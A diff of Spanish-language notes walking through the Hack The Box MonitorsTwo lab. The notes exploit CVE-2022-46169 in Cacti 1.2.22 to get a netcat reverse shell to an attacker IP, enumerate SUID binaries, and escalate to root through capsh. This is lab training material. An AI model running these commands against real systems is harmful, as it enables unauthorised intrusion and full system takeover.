@@ -7,4 +7,15 @@ HACK THE BOX - MONITORSTWO MACHINE
 - git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git                                                    -Copiamos el repositorio en alguna ruta y lo ejecutamos, el comando necesita de algunos parametros mostrados a continuación:
 - nc -lvnp 4444                                                                                                             -Netcat a la escucha para establecer la RSC
 - python3 /opt/Cacti1222/CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.43 --LPORT=4444                          -Ejecutamos el comando, antes con un nc a la escucha para establecer la Reverse Shell Connection.
--
+
+            - Una vez establecida la RSC, tenemos una terminal muy primitiva a lo que intentamos usar pithon para ejecutar /bin/bash, pero el sistema no contiene python por lo que, usamos el comando xterm a continuación
+
+- export TERM=xterm                                                                                                          -Nos permite establecer el tipo de terminal en uso, a lo que establecemos la Variable TERM con el terminal xterm
+- whoami                                                                                                                     -Verificamos que usuario somos
+- id                                                                                                                         -Verificamos a que grupos pertenecemos 
+- sudo -l                                                                                                                    -Verificamos que permisos tenemos como usuario www-data, pero el sistema no reconoce el comando sudo
+- find / -perm -u=s 2>/dev/null                                                                                              -El comando nos permite hacer una busqueda en todos los directorio, de archivos o directorios que tengan permisos "SUID", que ejecuta con permisos de propietario y no del usuario. a lo que encontramos posibles comandos de explotación como lo es "/sbin/capsh", y buscando en https://gtfobins.github.io, verificamos que hay posibilidad de explotación para escalada de privilegios.
+- cd /sbin                                                                                                                   -Nos dirigimos al directorio y ejecutamos el comando para la escalada de privilegios
+- ./capsh --gid=0 --uid=0 --                                                                                                 -Con el comando escalamos los privilegios a root y termiamos con permisos de superusuario.
+- whoami                                                                                                                     -Somos el usuario root
+            - Hacemos un research dentro de los archivos 
